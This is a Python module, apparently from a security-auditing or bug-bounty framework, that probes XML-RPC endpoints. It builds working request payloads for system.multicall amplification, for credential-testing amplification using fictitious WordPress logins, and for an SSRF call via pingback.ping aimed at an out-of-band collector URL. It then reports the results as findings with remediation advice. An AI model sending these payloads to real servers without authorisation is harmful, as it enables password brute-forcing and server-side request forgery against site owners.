"""xmlrpc_probe — audit interface XML-RPC apa pun (protocol-level, bukan WP-only).

Teknik dari lapangan (2026-09): xmlrpc.php yang terbuka penuh memberi attacker
dua primitif: (1) system.multicall = banyak eksekusi method dalam SATU request
(amplifikasi credential-testing), (2) pingback.ping = server melakukan fetch
ke URL pilihan attacker (SSRF). Keduanya dibuktikan terpisah.

Generik: bekerja untuk XML-RPC server mana pun (WordPress, Drupal, custom);
path endpoint bisa dioverride; method non-WP tetap terdeteksi.

FP-guard (wajib):
  - respons WAJIB <methodResponse> valid; kalau tidak, tidak ada kesimpulan;
  - multicall proof butuh >= 2 sub-hasil dalam SATU respons (bukan sekadar
    HTTP 200);
  - amplifikasi credential-testing dibuktikan dengan KREDENSIAL TIDAK ADA
    (nol sentuhan ke akun asli);
  - SSRF via pingback butuh bukti out-of-band: tanpa arg oob_check_url yang
    mengonfirmasi capture, status tetap UNCONFIRMED (jangan overclaim);
  - hanya GET/POST ke endpoint XML-RPC itu sendiri - nol probing internal.
"""

from __future__ import annotations

import json
import re
import time
import urllib.parse
import urllib.request

from . import http_engine
from .base import Tool, ToolContext, ToolResult, redact
from ..findings import Finding

_XMLRPC_DEFAULT = "/xmlrpc.php"


def _xml_post(base: str, path: str, payload: str, ctx: ToolContext,
              max_body: int = 80_000):
    url = urllib.parse.urljoin(base + "/", path.lstrip("/"))
    try:
        ctx.throttle()
        st, hd, body, _ms = http_engine.http_get(
            url, method="POST", data=payload.encode("utf-8", "replace"),
            headers={"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0"},
            timeout=ctx.timeout_s, max_body=max_body)
    except Exception as exc:
        return None, "", f"{type(exc).__name__}"
    ctx.world.request_count += 1
    if isinstance(st, int) and st < 500:
        ctx.world.observe_response(url, st, hd, body, "xmlrpc_probe")
    return st, body, url


def _methods_of(body: str) -> list[str]:
    return re.findall(r"<value><string>([a-zA-Z0-9_.]+)</string>", body or "")


class XmlRpcProbeTool(Tool):
    name = "xmlrpc_probe"
    description = ("Audit interface XML-RPC: daftar method, system.multicall "
                   "amplification (terbukti via 2 eksekusi/1 request), dan SSRF "
                   "pingback (butuh oob_url untuk status confirmed). Generik "
                   "untuk server XML-RPC apa pun.")
    risk_tags = {"active"}
    source_skill = "manual-bb-04"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        path = str(args.get("path") or _XMLRPC_DEFAULT)
        oob_url = str(args.get("oob_url") or "").strip()
        oob_check = str(args.get("oob_check_url") or "").strip()
        if not base:
            return ToolResult(tool=self.name, ok=True, data={"skipped": "no-url"})

        data: dict = {"endpoint": urllib.parse.urljoin(base + "/", path.lstrip("/"))}
        findings: list[Finding] = []

        # 1. listMethods: interface hidup?
        st, body, _u = _xml_post(base, path,
                                 "<?xml version='1.0'?><methodCall><methodName>"
                                 "system.listMethods</methodName><params></params>"
                                 "</methodCall>", ctx)
        if st is None or "<methodResponse" not in body:
            data["xmlrpc"] = f"closed/not-xmlrpc ({st})"
            ctx.world.note(f"xmlrpc_probe: {data['xmlrpc']}")
            return ToolResult(tool=self.name, ok=True, data=data)
        methods = _methods_of(body)
        data["methods"] = len(methods)
        if not methods:
            data["xmlrpc"] = "methodResponse tanpa daftar method"
            return ToolResult(tool=self.name, ok=True, data=data)

        # 2. multicall amplification (bukti generik: 2 method per request)
        multicall_ok = "system.multicall" in methods
        inner_hello = ("<value><struct><member><name>methodName</name><value>"
                       "<string>demo.sayHello</string></value></member><member>"
                       "<name>params</name><value><array><data></data></array>"
                       "</value></member></struct></value>")
        inner_list = ("<value><struct><member><name>methodName</name><value>"
                      "<string>system.listMethods</string></value></member>"
                      "<member><name>params</name><value><array><data></data>"
                      "</array></value></member></struct></value>")
        amp_proof = None
        if multicall_ok:
            for inner in (inner_hello * 2, inner_list * 2):
                payload = ("<?xml version='1.0'?><methodCall><methodName>"
                           "system.multicall</methodName><params><param><value>"
                           "<array><data>" + inner + "</data></array></value>"
                           "</param></params></methodCall>")
                st, mbody, _u = _xml_post(base, path, payload, ctx)
                # bukti multicall: >= 2 sub-hasil dalam SATU respons
                # (2 sub-array hasil ATAU >= 2 fault terproses)
                arrays = (mbody or "").count("<array><data>")
                faults = len(re.findall(r"<name>faultCode</name>", mbody or ""))
                if st == 200 and (arrays >= 3 or faults >= 2):
                    amp_proof = ("2 eksekusi method dalam SATU request "
                                 f"(HTTP 200, {arrays} sub-array / {faults} fault)")
                    break
        data["multicall"] = amp_proof or "not-proven"

        # 3. amplifikasi credential-testing (WP only, kredensial fiktif)
        cred_amp = None
        if multicall_ok and "wp.getUsersBlogs" in methods:
            def gb(i: int) -> str:
                return ("<value><struct>"
                        "<member><name>methodName</name><value><string>"
                        "wp.getUsersBlogs</string></value></member>"
                        "<member><name>params</name><value><array><data><value>"
                        f"<struct><member><name>blog_id</name><value><string>0"
                        f"</string></value></member><member><name>username</name>"
                        f"<value><string>xmlrpc-probe-{i}</string></value></member>"
                        f"<member><name>password</name><value><string>WrongPass{i}!"
                        f"</string></value></member></struct></value>"
                        "</data></array></value></member></struct></value>")
            payload = ("<?xml version='1.0'?><methodCall><methodName>system.multicall"
                       "</methodName><params><param><value><array><data>"
                       + gb(1) + gb(2) + gb(3) +
                       "</data></array></value></param></params></methodCall>")
            st, cbody, _u = _xml_post(base, path, payload, ctx)
            faults = len(re.findall(r"<name>faultCode</name>", cbody or ""))
            if st == 200 and faults >= 3:
                cred_amp = (f"{faults} pengecekan kredensial terproses dalam SATU "
                            f"request (kredensial fiktif, nol sentuhan akun asli)")
        data["credential_amplification"] = cred_amp or "not-applicable/not-proven"

        # 4. SSRF via pingback (butuh bukti OOB untuk confirmed)
        if "pingback.ping" in methods:
            confirmed = False
            pbody = ""
            if oob_url:
                payload = ("<?xml version='1.0'?><methodCall><methodName>pingback.ping"
                           "</methodName><params>"
                           f"<param><value><string>{oob_url}</string></value></param>"
                           f"<param><value><string>{base}/</string></value></param>"
                           "</params></methodCall>")
                st, pbody, _u = _xml_post(base, path, payload, ctx)
                if oob_check:
                    time.sleep(4)
                    try:
                        req = urllib.request.Request(
                            oob_check, headers={"Accept": "application/json",
                                                "User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=ctx.timeout_s + 6) as resp:
                            od = json.loads(resp.read().decode("utf-8", "replace"))
                        confirmed = int(od.get("total") or len(od.get("data") or [])) >= 1
                    except Exception:
                        confirmed = False
            findings.append(Finding(
                    tool=self.name,
                    title=(f"Unauthenticated SSRF via XML-RPC pingback on {base} "
                           + ("(out-of-band confirmed)" if confirmed
                              else "(call issued - confirm capture out-of-band)")),
                    severity="high" if confirmed else "medium",
                    cwe="CWE-918",
                    description=(
                        f"pingback.ping tersedia untuk pengunjung anonim di "
                        f"{data['endpoint']}. Dengan sourceURI yang dikontrol attacker, "
                        f"server melakukan fetch ke URL tersebut"
                        + (" - TERKONFIRMASI via capture out-of-band." if confirmed
                           else ". Panggilan telah dikeluarkan; konfirmasi capture "
                           "harus dilakukan operator pada collector-nya.") +
                        " Primitif ini memungkinkan server produksi dipakai memprobing "
                        "target eksternal atau internal."),
                    recommendation=(
                        "Matikan XML-RPC atau minimal blok pingback.ping; batasi "
                        "outbound fetch dari server aplikasi; rate-limit /xmlrpc.php."),
                    target_url=data["endpoint"],
                    request=(f"POST {path} (pingback.ping source={oob_url or '<attacker-url>'})"),
                    response=redact(pbody)[:200],
                    poc="curl -X POST <endpoint> -H 'Content-Type: text/xml' "
                        "-d '<pingback payload>' lalu cek collector",
                    confidence=0.95 if confirmed else 0.5,
                    source_skill=self.source_skill,
                    status="confirmed" if confirmed else "unconfirmed",
                    evidence_kind="request-response"))
        elif multicall_ok:
            pass

        # 5. temuan utama: multicall amplification (protocol-level, generik)
        if amp_proof:
            cred_note = (f" Amplifikasi credential-testing juga terbukti: {cred_amp}."
                         if cred_amp else "")
            findings.append(Finding(
                tool=self.name,
                title=(f"XML-RPC system.multicall amplification enabled on {base} "
                       f"({len(methods)} methods exposed)"),
                severity="medium", cwe="CWE-799",
                description=(
                    f"Interface XML-RPC di {data['endpoint']} terbuka untuk pengunjung "
                    f"anonim dengan {len(methods)} method. system.multicall terbukti "
                    f"memproses {amp_proof}.{cred_note} Dikombinasikan dengan enumerable "
                    f"username, ini menjadi amplifier credential-testing yang lolos dari "
                    f"rate-limit per-request."),
                recommendation=(
                    "Matikan XML-RPC bila tidak dipakai publik; bila dipakai, nonaktifkan "
                    "system.multicall, rate-limit method autentikasi, dan blok "
                    "pingback.ping."),
                target_url=data["endpoint"],
                request=f"POST {path} (system.multicall, 2 method)",
                response=redact(amp_proof),
                poc="curl -X POST <endpoint> -H 'Content-Type: text/xml' "
                    "-d '<multicall payload 2 method>'",
                confidence=1.0, source_skill=self.source_skill,
                status="confirmed", evidence_kind="request-response"))

        ctx.world.note(f"xmlrpc_probe: {len(methods)} methods, multicall="
                       f"{bool(amp_proof)}, pingback={'pingback.ping' in methods}")
        return ToolResult(tool=self.name, ok=True, data=data, findings=findings)
